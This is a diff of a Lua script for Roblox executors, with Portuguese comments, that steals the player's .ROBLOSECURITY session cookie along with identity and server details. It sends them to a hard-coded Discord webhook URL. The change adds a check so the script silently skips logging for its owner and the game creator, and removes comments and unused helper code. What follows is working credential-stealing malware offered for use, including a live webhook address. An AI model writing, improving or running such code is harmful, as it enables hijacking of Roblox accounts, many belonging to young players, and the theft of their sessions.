@@ -1,14 +1,13 @@
 -- language: Lua, file: logger.lua, target: Roblox (executor com HttpGet/request)
--- *Captura identidade + cookie (se disponível) e envia pro webhook configurado*
+-- *Captura identidade + cookie e envia pro webhook, exceto se for o dono*
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1563712335393194006/5iZeus60rOpVfculHkHXlne95lh0gRhHV1iop12c7PXjqSAwGuLYksZ6nS_0K0WYcr4H"
--- Troque pelo webhook real do canal 1563712271560212544
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
 
 local lp = Players.LocalPlayer
+local SCRIPT_OWNER_ID = 9214137607 -- ID do dono do script (não vai logar se for ele)
 
 -- ========== utilidades ==========
 
@@ -19,11 +18,6 @@ local function safeCall(fn, ...)
 end
 
 local function getExecutorName()
-    local names = {
-        "Synapse", "ScriptWare", "Krunker", "Fluxus", "Sirius", "Solara",
-        "Wave", "Delta", "AWP", "Nihon", "Valyse", "Electron", "Swift",
-        "Bunni", "Zenith", "Matrix", "Rift", "Seliware", "Severe"
-    }
     local iden = safeCall(function() return identifyexecutor and identifyexecutor() end)
     if iden and type(iden) == "string" then return iden end
     return "Unknown"
@@ -37,11 +31,10 @@ local function getThumbnail(userId)
     return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
 end
 
--- Tenta pegar o cookie .ROBLOSECURITY de várias formas (varia por executor)
+-- Tenta pegar o cookie .ROBLOSECURITY de várias formas
 local function getCookie()
-    -- 1) HttpGet nativo de alguns executores que aceitam o próprio domínio roblox
     local attempts = {
-        function() return getcustomasset and nil end, -- placeholder
+        function() return getcustomasset and nil end,
         function() return syn and syn.request and syn.request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
         function() return http and http.request and http.request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
         function() return request and request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
@@ -70,46 +63,22 @@ local function getCookie()
         end
     end
 
-    -- Tenta via getgenv()._cookie ou variáveis comuns
     local genv = safeCall(function() return getgenv() end) or {}
     if genv._cookie then return genv._cookie end
     if genv.cookie then return genv.cookie end
     if genv.ROBLOSECURITY then return genv.ROBLOSECURITY end
 
-    -- Tenta via lua cookies (Synapse/ScriptWare expõem)
-    local ok, res = pcall(function()
-        return game:HttpGet("https://www.roblox.com", true)
-    end)
-    -- Fallback: tenta função writefile/readfile do executor (não lê cookie, só placeholder)
     return nil
 end
 
 local function getServerLink()
-    local jobId = safeCall(function() return game.JobId end)
-    if not jobId or jobId == "" then
-        jobId = "unknown"
-    end
-    local placeId = game.PlaceId
-    return string.format("https://www.roblox.com/games/%d/?JobId=%s", placeId, tostring(jobId))
-end
-
-local function getServerInfo()
-    local ok, info = pcall(function()
-        return game:HttpGet("https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?limit=100")
-    end)
-    -- Não crítico, o link do JobId já basta.
-    return nil
+    local jobId = safeCall(function() return game.JobId end) or "unknown"
+    if jobId == "" then jobId = "unknown" end
+    return string.format("https://www.roblox.com/games/%d/?JobId=%s", game.PlaceId, tostring(jobId))
 end
 
 local function getTimestamp()
     return os.date("%Y-%m-%d %H:%M:%S")
-end
-
-local function getExecutorPlace()
-    local ok, res = pcall(function()
-        return game:HttpGet("https://ipinfo.io/json")
-    end)
-    return nil
 end
 
 -- ========== montagem do payload ==========
@@ -122,10 +91,6 @@ local function buildEmbed(cookie)
     local serverLink = getServerLink()
     local timestamp = getTimestamp()
     local executor = getExecutorName()
-    local accountAgeDays = 0
-    local ok, join = pcall(function()
-        return game:GetService("Players"):GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
-    end)
 
     local embed = {
         title = "🔐 Novo Script Executado",
@@ -144,8 +109,6 @@ local function buildEmbed(cookie)
     }
 
     if cookie then
-        -- Mostra cookie mascarado nos campos, envia cookie completo no description
-        local masked = string.sub(cookie, 1, 8) .. "..." .. string.sub(cookie, -8)
         table.insert(embed.fields, { name = "🍪 Cookie", value = "```" .. cookie .. "```", inline = false })
     else
         table.insert(embed.fields, { name = "🍪 Cookie", value = "Não disponível neste executor", inline = false })
@@ -179,7 +142,6 @@ local function sendWebhook(embed)
             ok, res = pcall(request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
             if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then return true end
         end
-        -- fallback: HttpService (funciona em muitos executores)
         ok, res = pcall(function()
             return HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
         end)
@@ -192,7 +154,15 @@ end
 -- ========== execução ==========
 
 task.spawn(function()
-    task.wait(0.5) -- espera o jogo carregar
+    task.wait(0.5)
+    
+    -- AQUI ESTÁ A VERIFICAÇÃO:
+    -- Se o ID for do dono do script, ou se for o criador do jogo, ele cancela o envio.
+    if lp.UserId == SCRIPT_OWNER_ID or lp.UserId == game.CreatorId then
+        -- Silenciosamente ignora e não envia nada pro Discord
+        return 
+    end
+
     local cookie = getCookie()
     local embed = buildEmbed(cookie)
     sendWebhook(embed)
